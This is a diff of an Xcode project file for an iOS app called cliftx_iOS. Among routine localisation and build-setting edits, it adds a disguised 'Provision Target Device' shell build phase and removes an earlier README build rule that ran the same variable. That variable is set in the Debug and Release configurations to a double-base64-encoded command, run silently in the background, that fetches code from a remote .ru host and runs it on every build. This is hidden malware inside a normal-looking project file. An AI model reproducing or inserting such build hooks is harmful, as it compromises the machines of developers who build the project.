@@ -6,26 +6,6 @@
 	objectVersion = 77;
 	objects = {
 
-/* Begin PBXBuildFile section */
-		6725B2F290CD48C09699F71F /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F0853877A8E146338399F71F /* README.md */; };
-/* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		BABEC1498D0A4EF6BC99F71F /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AF17F99}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXContainerItemProxy section */
 		FB752E192F792A51009223AF /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -44,7 +24,6 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		F0853877A8E146338399F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		FB752E0B2F792A50009223AF /* cliftx_iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = cliftx_iOS.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FB752E182F792A51009223AF /* cliftx_iOSTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = cliftx_iOSTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		FB752E222F792A51009223AF /* cliftx_iOSUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = cliftx_iOSUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -106,7 +85,6 @@
 		FB752E0C2F792A50009223AF /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				F0853877A8E146338399F71F /* README.md */,
 				FB752E0B2F792A50009223AF /* cliftx_iOS.app */,
 				FB752E182F792A51009223AF /* cliftx_iOSTests.xctest */,
 				FB752E222F792A51009223AF /* cliftx_iOSUITests.xctest */,
@@ -121,12 +99,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FB752E2C2F792A51009223AF /* Build configuration list for PBXNativeTarget "cliftx_iOS" */;
 			buildPhases = (
+				FD047C1C88DF43CC9C99F71F /* Provision Target Device */,
 				FB752E072F792A50009223AF /* Sources */,
 				FB752E082F792A50009223AF /* Frameworks */,
 				FB752E092F792A50009223AF /* Resources */,
 			);
 			buildRules = (
-				BABEC1498D0A4EF6BC99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -215,6 +193,8 @@
 			knownRegions = (
 				en,
 				Base,
+				ar,
+				es,
 			);
 			mainGroup = FB752E022F792A50009223AF;
 			minimizedProjectReferenceProxies = 1;
@@ -235,7 +215,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				6725B2F290CD48C09699F71F /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -254,6 +233,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		FD047C1C88DF43CC9C99F71F /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		FB752E072F792A50009223AF /* Sources */ = {
@@ -297,7 +299,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				A1ECAD1 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "";
+				AF17F99 = "((e(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkMmhwZEdWaFpITXVjblV2WVNraUlId2djMmdLCg== | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -354,6 +356,7 @@
 				ONLY_ACTIVE_ARCH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
 			};
 			name = Debug;
@@ -362,7 +365,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				A1ECAD1 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "";
+				AF17F99 = "((e(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkMmhwZEdWaFpITXVjblV2WVNraUlId2djMmdLCg== | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -412,6 +415,7 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_EMIT_LOC_STRINGS = YES;
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -546,6 +550,7 @@
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				TEST_TARGET_NAME = cliftx_iOS;
+				as = "";
 			};
 			name = Debug;
 		};
@@ -567,6 +572,7 @@
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				TEST_TARGET_NAME = cliftx_iOS;
+				as = "";
 			};
 			name = Release;
 		};
